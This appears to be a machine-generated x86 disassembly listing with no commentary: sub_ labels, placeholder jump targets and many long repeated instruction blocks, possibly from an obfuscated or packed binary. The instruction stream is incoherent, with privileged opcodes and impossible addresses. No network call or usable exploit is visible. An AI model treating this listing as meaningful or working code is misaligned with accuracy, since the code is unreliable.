pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
xchg [ edi ] cl
push esp
push eax
call sub_402d2a
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bb84
add [ eax ] al
jno 0xf9a86d7
sub_402ce3
add esp 0xc
jns r-xdata
pop eax
pop ecx
sub eax 0xbb830f
add [ eax ] al
jns 0x119b404
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd3c6d
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b235
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jge r-xdata
jns r-xdata
xor esi 0xac810f59
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_402d2a
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13bc5
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
jo 0xffffffff894f86eb
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402d2a
pop edx
add esp 0x4
jne r-xdata
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
xor edi 0xaae85157
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
add esp 0x4
jno r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_402d2a
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b235
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a86d7
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13bc5
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
jo 0xffffffff894f86eb
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_402d43
jae r-xdata
jne r-xdata
sub ecx 0xe89c579c
jb r-xdata
jne r-xdata
sub edi 0x4c4835a
jne r-xdata
pop edx
pop ecx
pop eax
jae r-xdata
mov ecx 0xf6811c75
pushfd
push edi
pushfd
call sub_402cc1
jo 0xff9a2ae
xor edi 0xaae85157
jg r-xdata
add esi 0x808f0f5a
add [ eax ] al
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd3c6d
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
jg r-xdata
jno 0xf9a86d7
push edi
call sub_402cda
jg 0xfffffffff0b38701
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push edi
push ecx
call sub_402ce3
add edx 0xff05e852
jne 0xffffffffc2c15ae7
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586621fd
ja r-xdata
jae r-xdata
call 0xffffffff854f8711
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c9b2
add esp 0x4
jno r-xdata
push ebp
pushfd
push eax
pushfd
add ebx 0xdc7f585a
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402c84
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_402d2a
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bb84
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b235
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_402caa
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13bc5
jl 0xffffffffc1c16007
push edx
call sub_402c46
and esi 0xe981dd73
jo 0xffffffff894f86eb
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ca7
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_402dfe
sub esp 0x14
push ebp
push edi
push esp
sub esp 0x8
call sub_402ea9
jns 0xffffffff9cc13d6b
add [ eax ] al
add [ 0xffffffff850f595a ] cl
jns r-xdata
jmp 0x1001689
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
push eax
push ecx
sub esp 0x10
call sub_402ea5
jo 0xffffffffff29bc66
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59753b97
jae r-xdata
or eax 0x15ff2875
push esi
call sub_402ef4
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c33e60
jns r-xdata
add ebx 0x9c575756
jae r-xdata
or eax 0x8d0fb671
jne r-xdata
call 0xffffffffcec170ed
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85badcf
jae r-xdata
jl 0xffffffffa1a4c109
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_402ec3
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c13ddd
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e230
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
pop ecx
add eax 0xfefc8d0f
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1cc14
jg r-xdata
jge 0x18ab47e
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jno r-xdata
xor eax 0xff56850f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jg r-xdata
jge 0xffffffffc009a494
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_403022
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jg r-xdata
jl 0xe24a24d
add esp 0x4
ja r-xdata
jge 0x100b31c
jns r-xdata
add esi 0x99870f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jg r-xdata
jne 0xffffffffe7c21d66
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f1c2
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jns r-xdata
xor esi 0x76795a59
jb 0x120b2b9
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jo 0xc6473e2
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jge r-xdata
call sub_402eb6
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14775
jae r-xdata
jpo 0x362887bb
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe728880b
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_403045
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b971
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
or eax 0x850f595a
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402f73
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba360
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a87d0
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40307e
sub esi 0xe92e7f58
push esp
push edi
call sub_402fa0
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13b7eb
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402ea5
jge r-xdata
add esp 0x8
jge 0xffffffff874fe122
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jg r-xdata
jge r-xdata
js 0x59753b97
jae r-xdata
or eax 0x15ff2875
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c33e60
jns r-xdata
add ebx 0x9c575756
jae r-xdata
jo 0xc6473e2
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
call 0xffffffffcec170ed
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85badcf
jae r-xdata
jl 0xffffffffa1a4c109
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
jae r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jge r-xdata
call sub_402eb6
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
push es
jno r-xdata
mov esp 0xd2775a59
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_402ec3
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c13ddd
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e230
push esi
call sub_402ef4
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jg r-xdata
jge 0x18ab47e
sub esp 0x1c
jge r-xdata
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1001689
push eax
push ecx
sub esp 0x10
call sub_402ea5
jo 0xffffffffff29bc66
or esi 0xf04c483
xor ebp 0xfffffffe
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pop ecx
add eax 0xfefc8d0f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jae r-xdata
or eax 0x8d0fb671
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1cc14
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_403022
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
add esp 0x4
ja r-xdata
jge 0x100b31c
jns r-xdata
add esi 0x99870f
jno r-xdata
xor eax 0xff56850f
pop eax
jg r-xdata
jne 0xffffffffe7c21d66
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f1c2
jg r-xdata
jge 0xffffffffc009a494
jns r-xdata
xor esi 0x76795a59
jb 0x120b2b9
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xe24a24d
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14775
jae r-xdata
jpo 0x362887bb
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe728880b
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_403045
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b971
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402f73
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba360
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a87d0
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40307e
sub esi 0xe92e7f58
push esp
push edi
call sub_402fa0
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13b7eb
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402ea9
jne r-xdata
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e230
pop ecx
pop edx
ja r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jne r-xdata
ja 0xffffffffe85badcf
jge r-xdata
sub edx 0xf281e771
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1cc14
jns r-xdata
add ebx 0x9c575756
call sub_402ec3
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c13ddd
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c33e60
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jno r-xdata
xor eax 0xff56850f
push esi
call sub_402ef4
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jne r-xdata
jl 0xffffffffa1a4c109
jg r-xdata
jge 0x18ab47e
pop ecx
add eax 0xfefc8d0f
jg r-xdata
jge 0xffffffffc009a494
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1001689
push eax
push ecx
sub esp 0x10
call sub_402ea5
jo 0xffffffffff29bc66
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59753b97
jae r-xdata
or eax 0x15ff2875
pop ecx
jae r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jg r-xdata
jl 0xe24a24d
jae r-xdata
or eax 0x8d0fb671
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
call 0xffffffffcec170ed
jno r-xdata
add ecx 0x8d0f3a7d
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_403022
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100b31c
jns r-xdata
add esi 0x99870f
jae r-xdata
jo 0xc6473e2
jne r-xdata
xor edi 0x5c775a59
pop eax
jg r-xdata
jne 0xffffffffe7c21d66
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f1c2
jge r-xdata
call sub_402eb6
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
xor esi 0x76795a59
jb 0x120b2b9
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jae r-xdata
or esi 0x937f5959
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14775
jae r-xdata
jpo 0x362887bb
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe728880b
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_403045
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b971
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402f73
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba360
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a87d0
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40307e
sub esi 0xe92e7f58
push esp
push edi
call sub_402fa0
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13b7eb
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402eb6
jno r-xdata
pop ecx
pop ecx
jg r-xdata
xor edx 0x59bc4079
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e230
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1cc14
jns r-xdata
add ebx 0x9c575756
jne r-xdata
xor edi 0x5c775a59
pop edx
ja r-xdata
pop ecx
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
pop edx
jne r-xdata
ja 0xffffffffe85badcf
jge r-xdata
sub edx 0xf281e771
jno r-xdata
